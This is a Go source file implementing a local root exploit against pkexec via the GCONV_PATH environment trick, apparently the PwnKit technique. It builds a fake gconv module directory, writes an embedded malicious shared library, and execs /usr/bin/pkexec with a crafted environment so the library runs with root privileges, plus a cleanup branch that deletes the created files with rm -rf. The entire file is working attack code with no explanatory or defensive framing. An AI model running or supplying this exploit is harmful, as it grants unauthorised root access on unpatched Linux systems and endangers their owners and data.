package main

import (
    _ "embed"
    "os"
    "os/exec"
    "syscall"
)

//go:embed pwnkit.so
var pwnkitso []byte

func check(err error) {
    if err != nil {
        panic(err)
    }
}

func main() {

    if len(os.Args) > 1 {
        err := exec.Command("/usr/bin/bash", "-c", "rm -rf 'GCONV_PATH=.'; rm -rf 'GCONV_PATH=./pwnkit'; rm -rf pwnkit").Run()
        check(err)
        return
    }

    os.Mkdir("GCONV_PATH=.", 0755)

    handler, err := os.Create("GCONV_PATH=./pwnkit")

    check(err)

    handler.Close()

    os.Chmod("GCONV_PATH=./pwnkit", 0755)

    os.Mkdir("pwnkit", 0755)

    module := []byte("module UTF-8// PWNKIT// pwnkit 2\n")

    err = os.WriteFile("pwnkit/gconv-modules", module, 0755)

    check(err)

    err = os.WriteFile("pwnkit/pwnkit.so", pwnkitso, 0755)

    check(err)

    envp := []string{
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
    }

    err = syscall.Exec("/usr/bin/pkexec", nil, envp)

    check(err)

}
